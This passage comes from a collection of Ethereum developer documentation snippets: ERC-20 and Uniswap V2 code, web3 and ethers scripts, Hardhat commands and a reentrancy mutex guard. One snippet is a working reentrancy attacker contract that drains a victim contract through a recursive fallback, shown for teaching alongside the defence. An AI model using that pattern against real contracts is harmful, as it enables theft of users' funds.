}\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Reentrancy Attack Contract in Solidity\nDESCRIPTION: This code showcases an attacker contract designed to exploit the reentrancy vulnerability in the Victim contract. It uses a fallback function to recursively call the victim's withdraw function and drain its funds.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract Attacker {\n    function beginAttack() external payable {\n        Victim(victim_address).deposit.value(1 ether)();\n        Victim(victim_address).withdraw();\n    }\n\n    function() external payable {\n        if (gasleft() > 40000) {\n            Victim(victim_address).withdraw();\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Signing and Sending Ethereum NFT Transactions with web3.js\nDESCRIPTION: This code demonstrates how to sign and send an Ethereum transaction for minting an NFT. It uses web3.js and Alchemy to interact with the blockchain, signs the transaction with a private key, and submits it to the network with error handling.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst API_URL = process.env.API_URL\nconst PUBLIC_KEY = process.env.PUBLIC_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\n\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(API_URL)\n\nconst contract = require(\"../artifacts/contracts/MyNFT.sol/MyNFT.json\")\nconst contractAddress = \"0x5a738a5c5fe46a1fd5ee7dd7e38f722e2aef7778\"\nconst nftContract = new web3.eth.Contract(contract.abi, contractAddress)\n\nasync function mintNFT(tokenURI) {\n  const nonce = await web3.eth.getTransactionCount(PUBLIC_KEY, \"latest\") //get latest nonce\n\n  //the transaction\n  const tx = {\n    from: PUBLIC_KEY,\n    to: contractAddress,\n    nonce: nonce,\n    gas: 500000,\n    data: nftContract.methods.mintNFT(PUBLIC_KEY, tokenURI).encodeABI(),\n  }\n\n  const signPromise = web3.eth.accounts.signTransaction(tx, PRIVATE_KEY)\n  signPromise\n    .then((signedTx) => {\n      web3.eth.sendSignedTransaction(\n        signedTx.rawTransaction,\n        function (err, hash) {\n          if (!err) {\n            console.log(\n              \"The hash of your transaction is: \",\n              hash,\n              \"\\nCheck Alchemy's Mempool to view the status of your transaction!\"\n            )\n          } else {\n            console.log(\n              \"Something went wrong when submitting your transaction:\",\n              err\n            )\n          }\n        }\n      )\n    })\n    .catch((err) => {\n      console.log(\" Promise failed:\", err)\n    })\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Event Emission in Solidity with Foundry\nDESCRIPTION: Code that demonstrates how to test event emission from a contract using Foundry's expectEmit functionality. It constructs calldata for a function that should emit an event and verifies the event is emitted with correct parameters.\n\nLANGUAGE: solidity\nCODE:\n```\nevent EntryWritten(uint indexed key, uint indexed value);\n\n        .\n        .\n        .\n\n        _callInput = bytes.concat(\n            worm.WRITE_ENTRY_CACHED(), worm.encodeVal(a), worm.encodeVal(b));\n        vm.expectEmit(true, true, false, false);\n        emit EntryWritten(a, b);\n        (_success,) = address(worm).call(_callInput);\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de web3_sha3 en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour calculer le hachage Keccak-256 (non pas SHA3-256 standard) de données en hexadécimal en utilisant la méthode web3_sha3.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"web3_sha3\",\"params\":[\"0x68656c6c6f20776f726c64\"],\"id\":64}'\n// Result\n{\n  \"id\":64,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x47173285a8d7341e5e972fc677286384f802f8ef42a5ec5f03bbfa254cb01fad\"\n}\n```\n\n----------------------------------------\n\nTITLE: Successful Deposit Handling in L2StandardBridge in Solidity\nDESCRIPTION: Code that executes when a deposit validation passes, minting the appropriate amount of L2 tokens to the recipient and emitting a DepositFinalized event.\n\nLANGUAGE: solidity\nCODE:\n```\n        ) {\n            // When a deposit is finalized, we credit the account on L2 with the same amount of\n            // tokens.\n            // slither-disable-next-line reentrancy-events\n            IL2StandardERC20(_l2Token).mint(_to, _amount);\n            // slither-disable-next-line reentrancy-events\n            emit DepositFinalized(_l1Token, _l2Token, _from, _to, _amount, _data);\n```\n\n----------------------------------------\n\nTITLE: Removing Liquidity with Permit for ETH Pairs with Fee-on-Transfer Token Support in Uniswap V2\nDESCRIPTION: Function combining permit-based approval with fee-on-transfer token support for removing liquidity from ETH pairs. Enables gas-less transactions for tokens with transfer fees.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountETH) {\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    amountETH = removeLiquidityETHSupportingFeeOnTransferTokens(\n        token, liquidity, amountTokenMin, amountETHMin, to, deadline\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Total Supply Variable\nDESCRIPTION: Declares a private state variable to track the total supply of tokens in circulation. This is a fundamental ERC-20 property that represents the sum of all token balances.\n\nLANGUAGE: solidity\nCODE:\n```\n    uint256 private _totalSupply;\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-20 TransferFrom Function in Solidity\nDESCRIPTION: The transferFrom function allows a spender to transfer tokens from another account that has approved them. It requires the sender and recipient cannot be zero addresses, the sender must have sufficient balance, and the caller must have sufficient allowance.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev See {IERC20-transferFrom}.\n *\n * Emits an {Approval} event indicating the updated allowance. This is not\n * required by the EIP. See the note at the beginning of {ERC20}.\n *\n * Requirements:\n *\n * - `sender` and `recipient` cannot be the zero address.\n * - `sender` must have a balance of at least `amount`.\n * - the caller must have allowance for ``sender``'s tokens of at least\n * `amount`.\n */\nfunction transferFrom(address sender, address recipient, uint256 amount) public virtual\n                                            override returns (bool) {\n    _transfer(sender, recipient, amount);\n```\n\n----------------------------------------\n\nTITLE: Creating Pair Exchange Function Signature in Uniswap V2\nDESCRIPTION: The function signature for createPair which is the main factory function that creates a new exchange pair between two ERC-20 tokens. This function can be called by anyone.\n\nLANGUAGE: solidity\nCODE:\n```\n    function createPair(address tokenA, address tokenB) external returns (address pair) {\n```\n\n----------------------------------------\n\nTITLE: Implementing a Mutex Pattern for Reentrancy Protection in Solidity\nDESCRIPTION: This code snippet demonstrates using a mutex lock to prevent reentrancy attacks. It uses a boolean state variable and a modifier to ensure that functions cannot be called recursively while already executing.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.7.0;\n\ncontract MutexPattern {\n    bool locked = false;\n    mapping(address => uint256) public balances;\n\n    modifier noReentrancy() {\n        require(!locked, \"Blocked from reentrancy.\");\n        locked = true;\n        _;\n        locked = false;\n    }\n    // This function is protected by a mutex, so reentrant calls from within `msg.sender.call` cannot call `withdraw` again.\n    //  The `return` statement evaluates to `true` but still evaluates the `locked = false` statement in the modifier\n    function withdraw(uint _amount) public payable noReentrancy returns(bool) {\n        require(balances[msg.sender] >= _amount, \"No balance to withdraw.\");\n\n        balances[msg.sender] -= _amount;\n        bool (success, ) = msg.sender.call{value: _amount}(\"\");\n        require(success);\n\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Sending an Ethereum Transaction in Web3.py\nDESCRIPTION: Creates and sends a transaction to transfer ether between accounts. Requires specifying the sender (from), recipient (to), amount to send (value), and gas limit. Returns a transaction hash.\n\nLANGUAGE: python\nCODE:\n```\ntx_hash = w3.eth.send_transaction({\n   'from': w3.eth.accounts[0],\n   'to': w3.eth.accounts[1],\n   'value': w3.to_wei(3, 'ether'),\n   'gas': 21000\n})\n```\n\n----------------------------------------\n\nTITLE: Emitting Transfer Event in ERC-20\nDESCRIPTION: Emit a Transfer event after successful token transfer. This event allows external applications like wallets to track token movements on the blockchain.\n\nLANGUAGE: solidity\nCODE:\n```\nemit Transfer(sender, recipient, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing transfer Function in ERC-20\nDESCRIPTION: The transfer function allows tokens to be sent from the caller's account to a recipient. It changes state (not view), emits a Transfer event upon success, and returns a boolean indicating success. This function is core to the ERC-20 token functionality.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token TransferFrom Function in Solidity\nDESCRIPTION: Implements the transferFrom function for ERC20 tokens that allows a spender to transfer tokens from an approved address to another address. It performs both the transfer and reduces the allowance in one transaction.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev See {IERC20-transferFrom}.\n *\n * Memancarkan aksi {Approval} menunjukkan tunjangan yang diperbarui. Ini tidak\n * diharuskan oleh EIP. Lihat catatan awal {ERC20}.\n *\n * Persyaratan:\n *\n * - `pengirim` dan `penerima` tidak dapat merupakan alamat nol.\n * - `pengirim` harus memiliki saldo `jumlah` minimum.\n * - pemanggil harus memiliki saldo untuk token``pengirim`` sebesar\n * `jumlah` minimum.\n */\nfunction transferFrom(address sender, address recipient, uint256 amount) public virtual\n                                            override returns (bool) {\n    _transfer(sender, recipient, amount);\n```\n\nLANGUAGE: solidity\nCODE:\n```\n    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount,\n         \"ERC20: transfer amount exceeds allowance\"));\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: Declaring ERC-20 Interface in Solidity\nDESCRIPTION: Defines the IERC20 interface that represents the standard ERC-20 token contract. This interface defines the required functions and events that any ERC-20 token must implement.\n\nLANGUAGE: solidity\nCODE:\n```\ninterface IERC20 {\n```\n\n----------------------------------------\n\nTITLE: Complete Ethereum Smart Contract Interaction Script\nDESCRIPTION: A full JavaScript script that connects to, reads from, updates, and reads again from a HelloWorld smart contract deployed on the Ethereum blockchain. Uses ethers.js and environment variables for connection details.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\nconst API_KEY = process.env.API_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\nconst CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS\n\nconst contract = require(\"../artifacts/contracts/HelloWorld.sol/HelloWorld.json\")\n\n// provider - Alchemy\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// signer - you\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// contract instance\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"this is the new message\")\n  await tx.wait()\n\n  const newMessage = await helloWorldContract.message()\n  console.log(\"The new message is: \" + newMessage)\n}\n\nmain()\n```\n\n----------------------------------------\n\nTITLE: Internal Swap Function Implementation in Solidity\nDESCRIPTION: The internal _swap function that processes token exchanges through a path of pair exchanges. It handles the core logic for routing tokens through multiple exchanges and ensuring tokens reach their final destination.\n\nLANGUAGE: solidity\nCODE:\n```\n    // **** SWAP ****\n    // requires the initial amount to have already been sent to the first pair\n    function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual {\n        for (uint i; i < path.length - 1; i++) {\n            (address input, address output) = (path[i], path[i + 1]);\n            (address token0,) = UniswapV2Library.sortTokens(input, output);\n            uint amountOut = amounts[i + 1];\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));\n            address to = i < path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n\n            IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(\n                amount0Out, amount1Out, to, new bytes(0)\n            );\n        }\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing transferFrom Function in ERC-20\nDESCRIPTION: The transferFrom function is used by approved spenders to transfer tokens from the owner's account to another account. It uses the allowance mechanism, requires prior approval, and decreases the caller's allowance. It emits a Transfer event and returns a boolean.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n```\n\n----------------------------------------\n\nTITLE: Installing Ethers.js and Hardhat Plugin\nDESCRIPTION: Command to install Ethers.js library and its Hardhat plugin to interact with Ethereum and facilitate contract deployment. This setup enables easier integration with the Ethereum blockchain.\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save-dev @nomiclabs/hardhat-ethers \"ethers@^5.0.0\"\n```\n\n----------------------------------------\n\nTITLE: Burning Liquidity Tokens in Uniswap V2 (Solidity)\nDESCRIPTION: Function that burns liquidity tokens when a provider withdraws liquidity from the pool. It calculates the appropriate amount of underlying tokens to return based on the proportion of liquidity tokens being burned relative to the total supply.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction burn(address to) external lock returns (uint amount0, uint amount1) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n(uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\naddress _token0 = token0;                                // gas savings\naddress _token1 = token1;                                // gas savings\nuint balance0 = IERC20(_token0).balanceOf(address(this));\nuint balance1 = IERC20(_token1).balanceOf(address(this));\nuint liquidity = balanceOf[address(this)];\n```\n\nLANGUAGE: solidity\nCODE:\n```\nbool feeOn = _mintFee(_reserve0, _reserve1);\nuint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee\namount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution\namount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution\nrequire(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');\n```\n\nLANGUAGE: solidity\nCODE:\n```\n_burn(address(this), liquidity);\n_safeTransfer(_token0, to, amount0);\n_safeTransfer(_token1, to, amount1);\nbalance0 = IERC20(_token0).balanceOf(address(this));\nbalance1 = IERC20(_token1).balanceOf(address(this));\n\n_update(balance0, balance1, _reserve0, _reserve1);\nif (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date\nemit Burn(msg.sender, amount0, amount1, to);\n}\n```\n\n----------------------------------------\n\nTITLE: React Application Entry Point with Wagmi and RainbowKit\nDESCRIPTION: Main TypeScript React file that sets up the application with necessary providers. It configures RainbowKit for wallet connection, Wagmi for Ethereum interactions, and wraps the main App component.\n\nLANGUAGE: tsx\nCODE:\n```\nimport '@rainbow-me/rainbowkit/styles.css'\nimport { RainbowKitProvider } from '@rainbow-me/rainbowkit'\nimport * as React from 'react'\nimport * as ReactDOM from 'react-dom/client'\nimport { WagmiConfig } from 'wagmi'\nimport { chains, config } from './wagmi'\n\nimport { App } from './App'\n\nReactDOM.createRoot(document.getElementById('root')!).render(\n  <React.StrictMode>\n    <WagmiConfig config={config}>\n      <RainbowKitProvider chains={chains}>\n        <App />\n      </RainbowKitProvider>\n    </WagmiConfig>\n  </React.StrictMode>,\n)\n```\n\n----------------------------------------\n\nTITLE: Swap Exact ETH For Tokens in Solidity\nDESCRIPTION: This function allows users to swap an exact amount of ETH for tokens. It wraps the ETH as WETH, validates the path starts with WETH, transfers WETH to the first pair, and executes the swap.\n\nLANGUAGE: solidity\nCODE:\n```\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    {\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).deposit{value: amounts[0]}();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n    }\n```\n\n----------------------------------------\n\nTITLE: Swap Exact Tokens For ETH in Solidity\nDESCRIPTION: This function allows users to swap an exact amount of tokens for ETH. It validates the path ends with WETH, calculates expected output amounts, transfers tokens to the first pair, executes the swap, and unwraps WETH to ETH.\n\nLANGUAGE: solidity\nCODE:\n```\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    {\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    }\n```\n\n----------------------------------------\n\nTITLE: Maintaining Price History and Constant Product Formula\nDESCRIPTION: Variables to track cumulative prices for oracle functionality and the k value (reserve product) which implements the constant product formula for the automated market maker.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public price0CumulativeLast;\nuint public price1CumulativeLast;\n```\n\nLANGUAGE: solidity\nCODE:\n```\nuint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token Contract in Solidity\nDESCRIPTION: A complete ERC20 token contract implementation with token name 'Basic' and symbol 'BSC'. The contract includes all standard ERC20 functionality, including transfers, allowances, minting, and related events, with proper mathematical safeguards against overflows.\n\nLANGUAGE: solidity\nCODE:\n```\n60806040523480156200001157600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: Initializing Hardhat Project\nDESCRIPTION: Command to initialize a new Hardhat project which creates a hardhat.config.js file for configuring the development environment.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat\n```\n\n----------------------------------------\n\nTITLE: Removing Liquidity from Token Pairs in Uniswap V2\nDESCRIPTION: This function removes liquidity from a Uniswap V2 pool for a token pair. It transfers the LP tokens from the sender to the pair contract, burns them to receive the underlying tokens, and verifies that the returned amounts meet the minimum requirements specified by the caller.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountA, uint amountB) {\n    address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n    IUniswapV2Pair(pair).transferFrom(msg.sender, pair, liquidity); // send liquidity to pair\n    (uint amount0, uint amount1) = IUniswapV2Pair(pair).burn(to);\n    (address token0,) = UniswapV2Library.sortTokens(tokenA, tokenB);\n    (amountA, amountB) = tokenA == token0 ? (amount0, amount1) : (amount1, amount0);\n    require(amountA >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n    require(amountB >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n}\n```\n\n----------------------------------------\n\nTITLE: Checking if Address is a Contract Using Assembly\nDESCRIPTION: Using Yul (EVM assembly) to check if an address is a contract by examining its code size. This helps identify if the recipient address is an actual smart contract.\n\nLANGUAGE: solidity\nCODE:\n```\nbool isToContract;\nassembly {\n   isToContract := gt(extcodesize(to), 0)\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Reserves and Price Accumulators in Uniswap V2 (Solidity)\nDESCRIPTION: This function updates the token reserves after trades or liquidity changes. It prevents overflow by requiring balances to fit within uint112, updates price accumulators for the first transaction in each block, and emits a Sync event with the new reserve values.\n\nLANGUAGE: solidity\nCODE:\n```\n    // update reserves and, on the first call per block, price accumulators\n    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'UniswapV2: OVERFLOW');\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n            // * never overflows, and + overflow is desired\n            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;\n            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;\n        }\n```\n\nLANGUAGE: solidity\nCODE:\n```\n        reserve0 = uint112(balance0);\n        reserve1 = uint112(balance1);\n        blockTimestampLast = blockTimestamp;\n        emit Sync(reserve0, 